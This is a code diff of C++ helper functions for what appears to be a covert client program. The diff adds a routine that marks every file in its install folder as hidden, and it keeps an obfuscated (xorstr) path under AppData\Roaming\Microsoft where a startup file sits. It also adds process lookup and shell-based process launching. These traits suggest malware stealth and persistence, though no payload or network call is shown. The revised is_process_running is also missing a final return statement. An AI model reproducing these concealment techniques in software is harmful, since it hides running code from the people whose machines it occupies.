@@ -43,7 +43,7 @@ namespace helpers {
 	}
 
 	bool is_initialized() {
-		for (const auto& entry : fs::directory_iterator(helpers::roaming + xorstr_("\\Microsoft\\"))) {
+		for (const auto& entry : fs::directory_iterator(client::PATH)) {
 			if (entry.path().filename().string() == client::STARTUP_FILE_NAME) {
 				return true;
 			}
@@ -51,22 +51,10 @@ namespace helpers {
 		return false;
 	}
 	
-	bool was_client_run() {
-		for (const auto& entry : fs::directory_iterator(helpers::roaming + xorstr_("\\Microsoft\\"))) {
-			if (entry.path().filename().string() == "gui.dll") {
-				return true;
-			}
+	void hide_all_files(std::string path) {
+		for (const auto& entry : fs::directory_iterator(path)) {
+			SetFileAttributes(entry.path().string().c_str(), FILE_ATTRIBUTE_HIDDEN);
 		}
-		return false;
-	}
-	
-	bool is_client_running() {
-		HANDLE hProcess = NULL;
-		hProcess = is_process_running(client::STARTUP_FILE_NAME.c_str(), PROCESS_QUERY_INFORMATION);
-		if (!hProcess || hProcess == INVALID_HANDLE_VALUE)
-			return false;
-		else
-			return true;
 	}
 
 	void start_process(std::string path)
@@ -74,14 +62,12 @@ namespace helpers {
 		ShellExecute(NULL, "open", path.c_str(), NULL, NULL, SW_SHOW);
 	}
 
-	void start_process_admin(std::string path)
-	{
+	void start_process_admin(std::string path) {
 		system(path.c_str());
 		//ShellExecute(NULL, "runas", path.c_str(), NULL, NULL, SW_SHOW);
 	}
 
-	HANDLE is_process_running(const char* process_name, DWORD dwAccess)
-	{
+	bool is_process_running(const char* process_name) {
 		HANDLE hProcessSnap;
 		HANDLE hProcess;
 		PROCESSENTRY32 pe32;
@@ -99,10 +85,34 @@ namespace helpers {
 		do
 		{
 			if (strcmp(pe32.szExeFile, process_name) == 0)
-				return OpenProcess(dwAccess, 0, pe32.th32ProcessID);
+				return true;
 
 		} while (Process32Next(hProcessSnap, &pe32));
 
+	}
+	
+	DWORD get_pid(const char* process_name) {
+		HANDLE hProcessSnap;
+		HANDLE hProcess;
+		PROCESSENTRY32 pe32;
+
+		hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+
+		if (hProcessSnap == INVALID_HANDLE_VALUE)
+			return 0;
+
+		pe32.dwSize = sizeof(PROCESSENTRY32);
+
+		if (!Process32First(hProcessSnap, &pe32))
+			return 0;
+
+		do
+		{
+			if (strcmp(pe32.szExeFile, process_name) == 0)
+				return pe32.th32ProcessID;
+
+		} while (Process32Next(hProcessSnap, &pe32));
+		return 0;
 	}
 
 	std::string exec(const char* cmd) {
@@ -162,4 +172,13 @@ namespace helpers {
 		return helpers::exec("where python").find("Python") != std::string::npos || helpers::exec("where python").find("python") != std::string::npos;
 	}
 
+	void replace_all(std::string& str, const std::string& from, const std::string& to) {
+		if (from.empty())
+			return;
+		size_t start_pos = 0;
+		while ((start_pos = str.find(from, start_pos)) != std::string::npos) {
+			str.replace(start_pos, from.length(), to);
+			start_pos += to.length(); // In case 'to' contains 'from', like replacing 'x' with 'yx'
+		}
+	}
 }
